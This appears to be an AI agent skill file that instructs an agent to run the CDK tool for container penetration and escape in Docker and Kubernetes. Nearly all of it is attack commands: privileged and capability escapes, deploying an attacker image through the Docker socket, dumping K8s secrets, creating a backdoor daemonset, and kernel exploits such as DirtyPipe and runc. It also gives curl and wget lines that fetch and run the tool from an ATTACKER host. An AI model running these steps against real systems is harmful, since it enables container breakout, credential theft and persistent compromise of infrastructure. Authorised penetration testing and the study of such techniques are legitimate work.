---
name: cdk-escape
description: "Use CDK for container environment penetration testing and escape. Use once you are inside a container environment (Docker/K8s pod) and need to assess escape possibilities, exploit container vulnerabilities, or perform in-container information gathering. CDK integrates container environment assessment, multiple escape techniques (privileged/mount/cgroup/lxcfs/runc/kernel exploits), and in-container lateral movement. The first step after getting a container shell should be running CDK for assessment. Use this skill for container escape, Docker penetration, K8s security, and container privilege escalation scenarios"
zh-signals: "使用 CDK 在容器环境中做信息收集、漏洞评估与逃逸利用，覆盖 Docker 与 K8s 场景。信号:容器逃逸,CDK,Docker,K8s,容器提权"
when-to-use: >-
  Use after gaining a container shell when assessing escape possibilities, exploiting
  container vulnerabilities, or performing in-container information gathering across
  Docker and Kubernetes.
metadata:
  tags: "cdk,container,docker,kubernetes,k8s,escape,container-escape,privileged,cgroup,runc,pod"
  category: "tool"
---

# CDK Container Penetration and Escape

CDK is the Swiss army knife of container penetration — **a single binary covering in-container information gathering, vulnerability detection, and escape exploitation**. After getting a container shell, run the CDK assessment first, then pick an escape path.

Project address: https://github.com/cdk-team/CDK

## Step 1: Environment Assessment

Run the assessment immediately after entering the container; CDK automatically detects all possible escape paths:

```bash
# Fully automatic assessment (recommended first choice)
cdk evaluate

# The assessment output lists:
# - Container runtime type (Docker/containerd/CRI-O)
# - Container permissions (privileged/capabilities)
# - Exploitable mount points
# - Available escape techniques
# - K8s Service Account Token
# - Network information
```

## Escape Techniques

### Privileged Container Escape

```bash
# When privileged=true is detected
cdk run mount-cgroup "cat /etc/shadow"
# or
cdk run mount-disk

# Escape via /dev devices
cdk run mount-procfs "cat /etc/shadow"
```

### Capabilities Escape

```bash
# CAP_SYS_ADMIN
cdk run mount-cgroup "whoami"

# CAP_DAC_READ_SEARCH
cdk run cap-dac-read-search

# CAP_SYS_PTRACE
cdk run check-ptrace
cdk run shim-pwn  # containerd-shim privilege escalation
```

### Docker Socket Escape

```bash
# When /var/run/docker.sock is found mounted
cdk run docker-sock-check
cdk run docker-sock-deploy "attacker_image"
```

### K8s Escape

```bash
# Leverage the Service Account Token
cdk run k8s-secret-dump
cdk run k8s-configmap-dump

# Create a privileged pod to escape
cdk run k8s-backdoor-daemonset
```

### Kernel Exploit Escape

```bash
# CVE-2021-22555 (Netfilter)
cdk run exploit-CVE-2021-22555

# CVE-2022-0847 (DirtyPipe)
cdk run exploit-CVE-2022-0847

# runc CVE-2019-5736
cdk run runc-pwn
```

## In-Container Information Gathering

```bash
# Scan internal network services (within the container network)
cdk run service-probe 10.0.0.0/24

# Probe the K8s API server
cdk run k8s-service-discovery

# Retrieve the metadata service (cloud environments)
cdk run cloud-metadata
```

## Tool Delivery

CDK is a statically compiled single binary, so delivering it into a container is easy:

```bash
# Method 1: download through a web vulnerability
curl -o /tmp/cdk https://ATTACKER/cdk && chmod +x /tmp/cdk

# Method 2: via a temporary Python HTTP server
# Attacker machine: python3 -m http.server 8000
# Inside the container: wget http://ATTACKER:8000/cdk -O /tmp/cdk && chmod +x /tmp/cdk
```

## Decision Tree

```
After entering the container:
├─ Step 1: cdk evaluate (automatically assess all escape paths)
├─ privileged=true → cdk run mount-cgroup / mount-disk
├─ docker.sock present → cdk run docker-sock-deploy
├─ K8s SA Token present → cdk run k8s-secret-dump
├─ capabilities present → exploit the matching capability
├─ none of the above → check the kernel version and try kernel exploits
└─ still no escape → lateral movement inside the container (service-probe the network segment)
```
